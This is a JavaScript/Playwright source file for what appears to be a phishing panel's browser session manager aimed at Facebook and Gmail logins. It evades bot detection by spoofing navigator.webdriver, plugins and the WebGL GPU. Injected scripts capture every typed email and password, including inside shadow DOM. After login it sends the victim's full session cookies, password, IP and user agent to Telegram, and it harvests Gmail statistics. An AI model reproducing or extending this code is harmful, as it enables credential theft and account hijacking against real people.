// Browser session manager.
//
// One persistent Chromium context per account, launched when the server starts
// and kept running 24/7. The profile lives at DATA_DIR/profiles/<id>.

import fsp from 'node:fs/promises';
import path from 'node:path';
import { chromium } from 'playwright';
import { config } from './config.js';
import { loadAccounts, getAccount, saveAccount } from './accounts.js';
import { resolveLocaleForIp } from './geo.js';
import * as telegram from './telegram.js';
import { collectGmailStats, formatStatsForTelegram } from './gmail-stats.js';

const sessions = new Map(); // accountId -> { context, page, lastActivity }
const starting = new Map(); // accountId -> Promise

// Activity log: what happens on the remote (Facebook/Gmail) page itself —
// navigation, captured credentials — for the panel's "LIVE TIME LOGS" tab.
// Not panel-UI actions (those aren't page activity).
const activityLog = [];
const MAX_LOG_ENTRIES = 300;
const LOG_EMOJI = { open: '👀', nav: '🧭', fill: '⌨️', clear: '🧹', capture: '🔑' };
// 'nav' is deliberately NOT mirrored to Telegram — a single page load
// normally fires several of these (redirect chains, retries), so it's just
// noise there even though it's useful in the panel's own LIVE TIME LOGS
// tab. The actually useful Telegram signal is the ✅ login-detected message
// (sent separately, see launch()'s framenavigated handler) plus captures.
const TELEGRAM_LOG_TYPES = new Set(['open', 'fill', 'clear', 'capture']);
function pushLog(accountId, type, message) {
  activityLog.push({ ts: Date.now(), accountId, type, message });
  if (activityLog.length > MAX_LOG_ENTRIES) activityLog.shift();
  // Mirror to Telegram — fire-and-forget, this stays a sync function used
  // from hot paths (framenavigated, CDP callbacks) and never awaits.
  if (TELEGRAM_LOG_TYPES.has(type)) {
    telegram.sendMessage(`${LOG_EMOJI[type] || 'ℹ️'} [${accountId}] ${message}`);
  }
}
export function getLogs(since = 0) {
  return activityLog.filter((e) => e.ts > since);
}
export const logActivity = pushLog;

export const DEFAULT_VIEWPORT = { width: 1366, height: 800 };

function profilePath(accountId) {
  return path.join(config.dataDir, 'profiles', accountId);
}

// Remove the Chromium profile dir for an account — called when a new
// account is created (so a leftover profile from a prior same-id account
// doesn't pre-seed cookies) and when an account is deleted (cleanup).
// Does nothing if the dir doesn't exist.
export async function wipeProfile(accountId) {
  const dir = profilePath(accountId);
  try {
    await fsp.rm(dir, { recursive: true, force: true });
    return true;
  } catch (err) {
    console.error('[browser] wipeProfile failed for', accountId, ':', err.message);
    return false;
  }
}

// True iff a profile dir already exists on disk for this account id.
export async function profileExists(accountId) {
  try {
    await fsp.access(profilePath(accountId));
    return true;
  } catch {
    return false;
  }
}

async function launch(accountId, adminIp) {
  const account = await getAccount(accountId);
  if (!account) throw new Error(`unknown account: ${accountId}`);

  const dir = profilePath(accountId);
  await fsp.mkdir(dir, { recursive: true });

  const useProxy = Boolean(config.proxyServer) && account.useProxy !== false;
  // Match the browser's displayed language to whoever is actually watching
  // it through the panel (the admin's own IP), not to the account
  // session's own exit IP — the admin wants to read the page in their own
  // language regardless of which country the VPS/proxy happens to be in.
  const { locale, timezoneId } = await resolveLocaleForIp(adminIp);

  const context = await chromium.launchPersistentContext(dir, {
    headless: true,
    channel: account.channel || config.browserChannel || undefined,
    viewport: DEFAULT_VIEWPORT,
    userAgent:
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    args: [
      '--disable-blink-features=AutomationControlled',
      '--no-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      `--window-size=${DEFAULT_VIEWPORT.width},${DEFAULT_VIEWPORT.height}`,
      `--ozone-override-screen-size=${DEFAULT_VIEWPORT.width},${DEFAULT_VIEWPORT.height}`,
      // Chrome's "Secure DNS" (DNS-over-HTTPS) connects straight to
      // 8.8.8.8/8.8.4.4 over HTTPS, bypassing --proxy-server entirely — we
      // saw this live (direct connections to Google's DoH resolvers from
      // the server's own IP, not through the proxy). If those hang, so does
      // the whole page load, no matter which proxy is configured. Force
      // plain DNS instead.
      '--disable-features=DnsOverHttps',
    ],
    ignoreDefaultArgs: ['--enable-automation'],
    // Per-account opt-out: confirmed live that this proxy's own anti-abuse
    // throttling silently hangs/aborts real-Chrome traffic to any Google
    // domain (mail, accounts, www) while curl and non-Google sites go
    // through it fine, and Gmail works perfectly over a *direct* connection
    // from this VPS. So accounts can set useProxy:false to skip it entirely
    // instead of fighting a proxy that won't let Chrome through to begin with.
    proxy: useProxy
      ? {
          server: config.proxyServer,
          username: config.proxyUsername || undefined,
          password: config.proxyPassword || undefined,
        }
      : undefined,
    locale,
    timezoneId,
    // Suppress Playwright's injection of navigator.webdriver = true
    bypassCSP: false,
  });

  // Remove the remaining webdriver trace that Playwright injects via CDP
  const lang = locale.split('-')[0];
  const languages = lang === 'en' ? [locale, lang] : [locale, lang, 'en-US', 'en'];
  context.addInitScript((languages) => {
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
    Object.defineProperty(navigator, 'languages', {
      get: () => languages,
    });
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });

    // Realistic-looking plugin list (headless Chrome reports none by default)
    const fakePlugins = [
      { name: 'PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
      { name: 'Chrome PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
      { name: 'Chromium PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
    ];
    Object.defineProperty(navigator, 'plugins', { get: () => fakePlugins });

    // window.chrome is missing under --headless=new; stub the bits sites probe for
    if (!window.chrome) window.chrome = {};
    if (!window.chrome.runtime) window.chrome.runtime = {};

    // Headless Chrome (and --disable-gpu) renders WebGL via SwiftShader, a
    // well-known automation tell. Report a plausible real GPU instead.
    const getParameterProto = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function (param) {
      if (param === 37445) return 'Intel Inc.'; // UNMASKED_VENDOR_WEBGL
      if (param === 37446) return 'Intel Iris OpenGL Engine'; // UNMASKED_RENDERER_WEBGL
      return getParameterProto.call(this, param);
    };
  }, languages);
  // Capture email/password as they're typed into login forms, so the panel
  // can show them without the admin re-entering them manually.
  await context.exposeBinding('__spCapture', async (_source, payload) => {
    try {
      const { type, value } = payload || {};
      if (!value || !type) return;
      if (type === 'fill') { pushLog(accountId, 'fill', `Wypełniono pole: ${value}`); return; }
      if (type === 'clear') { pushLog(accountId, 'clear', `Wyczyszczono pole: ${value}`); return; }
      const current = await getAccount(accountId);
      if (!current) return;
      if (type === 'password' && value !== current.password) {
        await saveAccount({ ...current, password: value });
        pushLog(accountId, 'capture', 'Przechwycono hasło');
      } else if (type === 'email' && value !== current.email) {
        await saveAccount({ ...current, email: value });
        pushLog(accountId, 'capture', `Przechwycono login: ${value}`);
      }
    } catch {
      /* ignore */
    }
  });
  // Login forms (especially Google's) often live inside shadow DOM, which a
  // plain querySelectorAll never sees — so this walks into every shadow root,
  // including ones created after the fact, by patching attachShadow.
  context.addInitScript(() => {
    const report = (type, value) => {
      try { window.__spCapture({ type, value }); } catch { /* binding not ready yet */ }
    };
    const fieldLabel = (el) =>
      el.getAttribute('aria-label') || el.placeholder || el.name || el.id || el.type || 'pole';

    const isEmailField = (el) =>
      el.type === 'email' ||
      el.id === 'identifierId' ||
      /email|login|user|identifier/i.test(`${el.name || ''} ${el.id || ''} ${el.autocomplete || ''}`);

    // Track last reported values to avoid duplicates
    const reported = { email: '', password: '' };

    const captureField = (el) => {
      const v = (el.value || '').trim();
      if (!v) return;
      if (el.type === 'password') {
        if (v !== reported.password) {
          reported.password = v;
          report('password', v);
        }
      } else if (isEmailField(el)) {
        if (v !== reported.email) {
          reported.email = v;
          report('email', v);
        }
      }
    };

    const bind = (el) => {
      if (el.__spBound) return;
      el.__spBound = true;
      let hadValue = Boolean(el.value);

      // Capture on blur/change (original)
      const handler = () => {
        const v = el.value;
        const has = Boolean(v);
        if (has) {
          captureField(el);
        } else if (!has && hadValue) {
          report('clear', fieldLabel(el));
        }
        hadValue = has;
      };
      el.addEventListener('blur', handler);
      el.addEventListener('change', handler);

      // Capture on input with debounce — catches values before page navigation
      let inputTimer = null;
      el.addEventListener('input', () => {
        clearTimeout(inputTimer);
        inputTimer = setTimeout(() => captureField(el), 800);
      });

      // Capture immediately on Enter key (form submission)
      el.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          clearTimeout(inputTimer);
          captureField(el);
        }
      });

      // If field already has a value (autofill), capture it
      if (el.value) {
        setTimeout(() => captureField(el), 500);
      }
    };

    // Intercept form submissions to capture all fields before navigation
    document.addEventListener('submit', (e) => {
      const form = e.target;
      if (!form?.querySelectorAll) return;
      form.querySelectorAll('input').forEach(captureField);
    }, true);

    // Intercept button clicks that might submit Google's multi-step form
    document.addEventListener('click', (e) => {
      const btn = e.target?.closest?.('button, [role="button"], .VfPpkd-LgbsSe');
      if (!btn) return;
      const form = btn.closest('form');
      if (form) form.querySelectorAll('input').forEach(captureField);
      // Google's "Next" button is often outside the form
      document.querySelectorAll('#identifierId, input[type="email"], input[type="password"]')
        .forEach(captureField);
    }, true);

    const FIELD_SELECTOR =
      'input[type="password"], input[type="email"], input[type="text"], input[type="tel"], input[type="search"], input[type="number"], textarea';
    // Re-scanning the WHOLE document on every single DOM mutation (the old
    // approach) pins the page's main thread solid on a site like Gmail that
    // mutates constantly — the page never finishes rendering because our own
    // observer callback never stops running. Only ever look at what the
    // mutation actually added.
    const visit = (node) => {
      if (node.nodeType !== 1) return;
      if (node.matches?.(FIELD_SELECTOR)) bind(node);
      if (node.shadowRoot) watch(node.shadowRoot);
      node.querySelectorAll?.(FIELD_SELECTOR).forEach(bind);
      node.querySelectorAll?.('*').forEach((el) => { if (el.shadowRoot) watch(el.shadowRoot); });
    };
    const watch = (root) => {
      if (root.__spWatched) return;
      root.__spWatched = true;
      root.querySelectorAll(FIELD_SELECTOR).forEach(bind);
      root.querySelectorAll('*').forEach((el) => { if (el.shadowRoot) watch(el.shadowRoot); });
      new MutationObserver((records) => {
        for (const r of records) r.addedNodes.forEach(visit);
      }).observe(root, { childList: true, subtree: true });
    };
    const origAttachShadow = Element.prototype.attachShadow;
    Element.prototype.attachShadow = function (init) {
      const root = origAttachShadow.call(this, init);
      watch(root);
      return root;
    };
    watch(document);
  });

  const page = context.pages()[0] || (await context.newPage());
  // Presence of one of these session cookies is a reliable, platform-level
  // signal that the account is actually logged in (far more robust than
  // guessing from the URL or page title) — fires the Telegram notification
  // + cookie export exactly once per session the first time it's seen.
  // Cookies that are ONLY set after a real logged-in session, not for
  // anonymous visits:
  //   c_user           — Facebook (logged-in user id)
  //   __Secure-1PSID   — Google (set only after signing into an account)
  //   __Secure-3PSID   — Google (ditto, 3rd-party-cookie flavor)
  // We previously included bare "SID", but Google sets SID even for
  // anonymous visits to its domains (search, YouTube, Gmail landing page),
  // which fired the "logged in" notification before the user ever typed
  // credentials. Dropped.
  const LOGIN_COOKIE_NAMES = ['c_user', '__Secure-1PSID', '__Secure-3PSID'];
  let notifiedLogin = false;
  page.on('framenavigated', (frame) => {
    if (frame !== page.mainFrame()) return;
    pushLog(accountId, 'nav', frame.url());
    if (notifiedLogin) return;
    context.cookies().then(async (cookies) => {
      // Require a login cookie with a plausibly-long value — anonymous or
      // placeholder values are usually under 20 chars; a real signed-in
      // session has a 50+ char opaque id.
      const loggedIn = cookies.some(
        (c) => LOGIN_COOKIE_NAMES.includes(c.name) && (c.value || '').length > 30
      );
      if (!loggedIn) return;
      notifiedLogin = true;
      // Re-fetch the account — email/password may have been captured (and
      // saved) by __spCapture after launch() first read it, so the closure's
      // own `account` var can be stale by the time login is detected.
      let current = await getAccount(accountId).catch(() => null) || account;
      // If the email wasn't captured from the login form (common on Gmail
      // when the user picks an account from the chooser instead of typing
      // it), read it from the logged-in page itself.
      if (!current.email) {
        const detected = await page.evaluate(() => {
          const metaEmails = Array.from(document.querySelectorAll(
            'meta[content*="@"], [data-email], [data-identifier]'
          )).map((el) => el.getAttribute('content') || el.getAttribute('data-email') || el.getAttribute('data-identifier') || '');
          const ariaEmails = Array.from(document.querySelectorAll('a[aria-label*="@"], [aria-label*="@"]'))
            .map((el) => el.getAttribute('aria-label') || '');
          const bodyText = (document.body?.innerText || '').slice(0, 200000);
          const all = [...metaEmails, ...ariaEmails, bodyText].join('\n');
          const m = all.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
          return m ? m[0] : null;
        }).catch(() => null);
        if (detected) {
          await saveAccount({ ...current, email: detected });
          current = { ...current, email: detected };
          pushLog(accountId, 'capture', `Wykryto email ze strony: ${detected}`);
        }
      }
      // Grab UA and outbound IP (what Gmail/Facebook actually see) in
      // parallel — each with its own short timeout so a slow probe can't
      // delay the Telegram notification.
      const [ua, ip] = await Promise.all([
        page.evaluate(() => navigator.userAgent).catch(() => null),
        (async () => {
          const probes = [
            'https://api.ipify.org?format=json',
            'https://api.myip.com',
            'https://ipinfo.io/json',
          ];
          for (const url of probes) {
            try {
              const r = await context.request.get(url, { timeout: 3500 });
              if (!r.ok()) continue;
              const j = await r.json();
              return j.ip || j.query || null;
            } catch { /* try next */ }
          }
          return null;
        })(),
      ]);
      if (ip && ip !== current.ip) {
        await saveAccount({ ...current, ip });
        current = { ...current, ip };
      }
      if (ua && ua !== current.ua) {
        await saveAccount({ ...current, ua });
        current = { ...current, ua };
      }

      const caption = [
        `✅ Zalogowano: ${current.label}`,
        `Platforma: ${current.label}`,
        `Email: ${current.email || '(brak)'}`,
        `Hasło: ${current.password || '(brak)'}`,
        `IP: ${ip || '(brak)'}`,
        `UA: ${ua || '(brak)'}`,
      ].join('\n');
      // One Telegram message (a document with this as its caption) instead
      // of a separate text message + file — everything at a glance.
      telegram.sendDocument(
        Buffer.from(JSON.stringify(cookies, null, 2)),
        `${accountId}-cookies.json`,
        caption
      );
      // Auto-collect Gmail stats for Gmail accounts (runs in background, ~60-90s)
      if (/mail\.google\.com/i.test(current.startUrl || '')) {
        setTimeout(() => {
          collectGmailStats(context, null, accountId)
            .then((stats) => telegram.sendMessage(formatStatsForTelegram(current.label, stats), { parseMode: 'HTML' }))
            .catch(() => {});
        }, 5000);
      }
    }).catch(() => {});
  });

  const s = { context, page, lastActivity: Date.now() };
  sessions.set(accountId, s);
  context.on('close', () => {
    if (sessions.get(accountId) === s) sessions.delete(accountId);
  });

  // Navigate in the BACKGROUND — don't await it. The session is ready the
  // moment the browser is up, so start() returns instantly and the viewer
  // connects right away, watching the page paint in live over the stream
  // (just like a real remote desktop) instead of staring at a spinner until
  // every resource has finished loading through the proxy. 'commit' means
  // we don't even wait for the HTML parse — navigation just begins.
  //
  // google.com domains specifically hang or get aborted through this proxy
  // (confirmed: curl through the same proxy reaches Google fine, and Chrome
  // through the proxy reaches non-Google sites fine — only real-Chrome
  // traffic to Google via this proxy stalls, almost certainly the proxy's
  // own anti-abuse throttling). A fresh connection occasionally gets through
  // anyway, so retry a couple of times before giving up.
  const navigate = async () => {
    await page.goto(account.startUrl, { waitUntil: 'commit', timeout: 20000 });
    await page.waitForLoadState('load', { timeout: 20000 });
  };
  (async () => {
    const maxAttempts = 3;
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      try {
        await navigate();
        return;
      } catch (err) {
        if (attempt === maxAttempts) {
          const reason = String(err.message || err).split('\n')[0].replace(/[<>&]/g, '');
          pushLog(accountId, 'nav', `nie udało się otworzyć strony po ${maxAttempts} próbach: ${reason}`);
          await page
            .setContent(`<body style="font:16px sans-serif;padding:2em"><h2>Nie udało się otworzyć ${account.startUrl}</h2><p>${reason}</p><p>Proxy mogło zablokować lub zawiesić połączenie po ${maxAttempts} próbach.</p></body>`)
            .catch(() => {});
        }
      }
    }
  })();
  return s;
}

export async function start(accountId, adminIp) {
  if (sessions.has(accountId)) {
    sessions.get(accountId).lastActivity = Date.now();
    return status(accountId);
  }
  if (!starting.has(accountId)) {
    starting.set(accountId, launch(accountId, adminIp).finally(() => starting.delete(accountId)));
  }
  await starting.get(accountId);
  return status(accountId);
}

export async function startAll(log = console) {
  const accounts = await loadAccounts();
  await Promise.all(
    accounts.map((a) => start(a.id).catch((err) => log.error({ err, account: a.id }, 'browser start failed')))
  );
}

// Keep a session alive while it's actively being watched/interacted with
// (called per screencast frame / input event from viewer.js).
export function touchActivity(accountId) {
  const s = sessions.get(accountId);
  if (s) s.lastActivity = Date.now();
}

const IDLE_TIMEOUT_MS = 10 * 60 * 1000; // stop a session after 10 min of no activity
const REAPER_INTERVAL_MS = 60 * 1000;

export function startIdleReaper(log = console) {
  setInterval(() => {
    const now = Date.now();
    for (const [accountId, s] of sessions) {
      if (now - s.lastActivity > IDLE_TIMEOUT_MS) {
        log.info({ accountId }, 'stopping idle browser session');
        stop(accountId).catch((err) => log.error({ err, accountId }, 'idle stop failed'));
      }
    }
  }, REAPER_INTERVAL_MS);
}

export function getPage(accountId) {
  const s = sessions.get(accountId);
  if (!s) return null;
  s.lastActivity = Date.now();
  return s.page;
}

export function getContext(accountId) {
  const s = sessions.get(accountId);
  if (!s) return null;
  s.lastActivity = Date.now();
  return s.context;
}

export async function newCdpSession(accountId) {
  const s = sessions.get(accountId);
  if (!s) return null;
  s.lastActivity = Date.now();
  return s.context.newCDPSession(s.page);
}

export async function stop(accountId) {
  const s = sessions.get(accountId);
  if (!s) return { running: false };
  sessions.delete(accountId);
  // The underlying Chrome process may already be dead (crashed, or killed
  // out from under us) by the time this runs — close() then rejects with
  // "Target ... has been closed" instead of just being a no-op. That used
  // to be an unhandled rejection that took the whole server down with it.
  await s.context.close().catch(() => {});
  return { running: false };
}

export function status(accountId) {
  const s = sessions.get(accountId);
  return {
    accountId,
    running: Boolean(s),
    lastActivity: s ? s.lastActivity : null,
  };
}

export function listStatus() {
  return [...sessions.keys()].map((id) => status(id));
}

export async function shutdownAll() {
  await Promise.all([...sessions.keys()].map((id) => stop(id).catch(() => {})));
}
